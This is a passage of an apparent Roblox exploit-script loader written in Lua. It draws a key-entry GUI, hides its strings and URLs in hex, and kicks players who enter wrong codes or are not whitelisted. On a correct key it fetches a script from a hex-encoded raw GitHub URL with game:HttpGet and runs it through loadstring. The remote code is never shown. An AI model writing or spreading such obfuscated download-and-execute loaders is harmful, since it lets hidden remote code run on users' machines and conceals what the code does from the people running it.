    g.Text = getStr('437265617465642062793A204665617374')
    g.Size = UDim2.new(0, 200, 0, 20)
    g.Position = UDim2.new(0, 100, 0, 160)
    g.BackgroundColor3 = Color3.new(1, 1, 1)
    g.BackgroundTransparency = 1

    h.Font = Enum.Font.SourceSans
    h.FontSize = Enum.FontSize.Size18
    h.TextColor3 = Color3.new(1, 1, 1)
    h.Text = getStr('48656C7065723A2050696572636572')
    h.Size = UDim2.new(0, 200, 0, 20)
    h.Position = UDim2.new(0, 100, 0, 180)
    h.BackgroundColor3 = Color3.new(1, 1, 1)
    h.BackgroundTransparency = 1

    a.Parent = game.Players.LocalPlayer.PlayerGui
    b.Parent = a

    -- Load and execute obfuscated code from URLs
    local function encodeURL(s)
        return loadstring("return '" .. s .. "'")()
    end

    local ajk = loadstring(game:HttpGet(getStr('68747470733A2F2F7261772E6769746875622E636F6D2F584665617374586C2F54657374692F6D61696E2F546573746A61616A6462616A7275786A77686462786A73')))()
    local bcd = ajk
    local efg = 0

    local function hij()
        efg = efg + 1
        
        if d.Text == "" or d.Text == bcd then
            if d.Text == bcd then
                a:Destroy()
                loadstring(game:HttpGet(getStr('68747470733A2F2F7261772E6769746875622E636F6D2F584665617374586C2F41574F44494841574A49524F48342D57522D4A49416469617768696F2F6D61696E2F64574F444869776F616544483832337948492A2534305948282532342546305946637361756964415745594828504551452921484548444F25334150705B646F617770646A6E7361')))()
            else
                print(getStr('506C6561736520656E746572206120636F646521'))
            end
        else
            if efg >= 3 then
                game.Players.LocalPlayer:Kick(getStr('496E636F727265637420636F646520286D617820617474656D707473207265616368656429'))
            else
                print(getStr('496E636F727265637420636F64652C2074727920616761696E21'))
            end
        end

        if d.Text:match('%W') then
            game.Players.LocalPlayer:Kick(getStr('537573706963696F7573206163746976697479206465736374656420'))
        end

        if d.Text:lower():match(getStr('73656C656374')) or d.Text:lower():match(getStr('696E7365727420')) or d.Text:lower():match(getStr('757064617465')) or d.Text:lower():match(getStr('64656C657465')) then
            game.Players.LocalPlayer:Kick(getStr('53514C20726573746D6164696E20617474656D707420646576656C6F706D656E747020646574656374656420')) 
        end
    end

    e.MouseButton1Click:Connect(hij)

    c.Parent = b
    d.Parent = b
    e.Parent = b
    f.Parent = b
    g.Parent = b
    h.Parent = b
    i.Parent = b

    a.Enabled = true

else
    game.Players.LocalPlayer:Kick(getStr('596F7520617265206E6F74207768697465736C6973746564206D6573736167652E'))
end
